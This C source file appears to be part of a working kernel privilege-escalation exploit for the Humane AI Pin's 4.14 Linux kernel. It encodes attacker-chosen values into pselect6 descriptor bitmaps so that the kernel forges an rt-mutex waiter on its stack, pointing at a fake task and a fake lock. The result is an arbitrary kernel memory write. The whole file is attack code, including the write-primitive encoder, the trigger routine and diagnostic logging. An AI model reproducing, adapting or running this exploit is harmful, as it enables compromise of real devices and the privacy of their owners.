/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin pselect6 waiter encoder, 2026.
 *
 * New 4.14 target adaptation. The GhostLock route derives from the
 * Apache-2.0 NebuSec implementation; the result-map geometry is specific to
 * the profiled AI Pin kernel.
 */
#include "common.h"

static struct pselect_waiter_stamp main_stamp;
static atomic_int main_stamp_is_ready;

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  ((unsigned long *)set)[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  return (uint64_t)((const unsigned long *)set)[word];
}

static int count_set_bits(const fd_set *set) {
  int count = 0;
  for (int word = 0; word < PSELECT_ROUTE_WORDS_PER_SET; ++word) {
    count += __builtin_popcountll(fdset_get_word(set, word));
  }
  return count;
}

static void extract_waiter_words(const struct pselect_waiter_stamp *stamp,
                                 uint64_t words[WAITER_QWORDS]) {
  for (int i = 0; i < 4; ++i) {
    words[i] = fdset_get_word(&stamp->read_set, i + 1);
  }
  for (int i = 4; i < 9; ++i) {
    words[i] = fdset_get_word(&stamp->write_set, i - 4);
  }
  words[9] = fdset_get_word(&stamp->except_set, 0);
}

int pselect_waiter_stamp_matches(const struct pselect_waiter_stamp *stamp) {
  uint64_t observed[WAITER_QWORDS];
  extract_waiter_words(stamp, observed);
  return FD_ISSET(PSELECT_ROUTE_SENTINEL_FD, &stamp->read_set) &&
         memcmp(observed, stamp->expected, sizeof(observed)) == 0;
}

static int duplicate_selected_descriptors(
    const struct pselect_waiter_stamp *stamp, int source_fd) {
  int duplicates = 0;
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; ++fd) {
    int selected = FD_ISSET(fd, &stamp->read_set) ||
                   FD_ISSET(fd, &stamp->write_set) ||
                   FD_ISSET(fd, &stamp->except_set);
    if (!selected) {
      continue;
    }
    if (dup2(source_fd, fd) != fd) {
      return -1;
    }
    ++duplicates;
  }

  /* Keep max_fds above nfds so core_sys_select cannot clamp the bitmap. */
  if (dup2(source_fd, PSELECT_ROUTE_NFDS - 1) != PSELECT_ROUTE_NFDS - 1) {
    return -1;
  }
  return duplicates;
}

int pselect_prepare_waiter_stamp(struct pselect_waiter_stamp *stamp,
                                 const uint64_t words[WAITER_QWORDS]) {
  if (!stamp || !words || FD_SETSIZE < PSELECT_ROUTE_NFDS ||
      sizeof(unsigned long) != sizeof(uint64_t)) {
    errno = EINVAL;
    return 0;
  }

  memset(stamp, 0, sizeof(*stamp));
  stamp->ready_fd = -1;
  stamp->peer_fd = -1;
  memcpy(stamp->expected, words, sizeof(stamp->expected));

  for (int i = 0; i < 4; ++i) {
    fdset_put_word(&stamp->read_set, i + 1, words[i]);
  }
  for (int i = 4; i < 9; ++i) {
    fdset_put_word(&stamp->write_set, i - 4, words[i]);
  }
  fdset_put_word(&stamp->except_set, 0, words[9]);
  FD_SET(PSELECT_ROUTE_SENTINEL_FD, &stamp->read_set);

  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sockets) != 0) {
    return 0;
  }
  stamp->ready_fd = fcntl(sockets[0], F_DUPFD_CLOEXEC,
                          PSELECT_ROUTE_HIGH_FD);
  int peer_floor = stamp->ready_fd >= 0 ? stamp->ready_fd + 1
                                        : PSELECT_ROUTE_HIGH_FD + 1;
  stamp->peer_fd = fcntl(sockets[1], F_DUPFD_CLOEXEC, peer_floor);
  int dup_errno = errno;
  close(sockets[0]);
  close(sockets[1]);
  errno = dup_errno;
  if (stamp->ready_fd < 0 || stamp->peer_fd < 0) {
    return 0;
  }

  unsigned char marker = 0x5a;
  if (write(stamp->peer_fd, &marker, 1) != 1) {
    return 0;
  }
  stamp->duplicated_count = duplicate_selected_descriptors(
      stamp, stamp->ready_fd);
  if (stamp->duplicated_count < 0) {
    return 0;
  }
  stamp->ready_count = count_set_bits(&stamp->read_set) +
                       count_set_bits(&stamp->write_set) +
                       count_set_bits(&stamp->except_set);

  /* Prove the descriptor-to-result-map encoding before corrupting a waiter. */
  struct pselect_waiter_stamp check = *stamp;
  struct timespec no_wait = {0, 0};
  errno = 0;
  long rc = syscall(SYS_pselect6, PSELECT_ROUTE_NFDS,
                    &check.read_set, &check.write_set, &check.except_set,
                    &no_wait, NULL);
  if (rc != stamp->ready_count || errno != 0 ||
      !pselect_waiter_stamp_matches(&check)) {
    errno = EPROTO;
    return 0;
  }
  return 1;
}

int pselect_execute_waiter_stamp(struct pselect_waiter_stamp *stamp) {
  return (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS,
                      &stamp->read_set, &stamp->write_set,
                      &stamp->except_set, NULL, NULL);
}

static int encode_requested_write(uint64_t words[WAITER_QWORDS]) {
  uintptr_t destination = pselect_write_target();
  uintptr_t source = pselect_write_value();
  int shape = pselect_write_shape();

  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  if (shape == 0) {
    parent = source;
    right = 0;
    left = destination;
  } else if (shape == 1 && destination >= sizeof(uint64_t)) {
    parent = destination - sizeof(uint64_t);
    right = source;
    left = 0;
  } else {
    errno = EINVAL;
    return 0;
  }

  const uint64_t encoded[WAITER_QWORDS] = {
      parent, right, left,
      parent, right, left,
      fake_task, fake_lock, FAKE_WAITER_PRIO, 0,
  };
  memcpy(words, encoded, sizeof(encoded));
  return 1;
}

int prepare_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_task) {
    errno = EINVAL;
    return 0;
  }

  uint64_t words[WAITER_QWORDS];
  if (!encode_requested_write(words) ||
      !pselect_prepare_waiter_stamp(&main_stamp, words)) {
    return 0;
  }
  atomic_store(&main_stamp_is_ready, 1);
  pr_info("pselect6 encoder ready result=%d fds=%d page=%016zx "
          "lock=%016zx task=%016zx\n",
          main_stamp.ready_count, main_stamp.duplicated_count,
          page_base, fake_lock, fake_task);
  return 1;
}

void do_pselect_fake_lock_route(void) {
  if (!atomic_load(&main_stamp_is_ready)) {
    pr_error("pselect6 waiter encoder was not prepared\n");
  }

  atomic_store(&main_route_delay_usec, 0);
  errno = 0;
  int rc = pselect_execute_waiter_stamp(&main_stamp);
  int call_errno = errno;

  /* A syscall here would reuse the stack containing the forged waiter. */
  atomic_store(&punch_consume_go, 1);
  while (atomic_load(&punch_consume_go) == 1) {
    __asm__ volatile("yield" ::: "memory");
  }

  int exact = pselect_waiter_stamp_matches(&main_stamp);
  int calls = atomic_load(&consumer_calls);
  int successes = atomic_load(&consumer_success);
  pr_info("pselect6 route rc=%d expected=%d errno=%d exact=%d calls=%d "
          "successes=%d\n",
          rc, main_stamp.ready_count, call_errno, exact, calls, successes);
  if (rc != main_stamp.ready_count || call_errno || !exact) {
    pr_warning("pselect6 result map did not preserve the waiter stamp\n");
  }
}
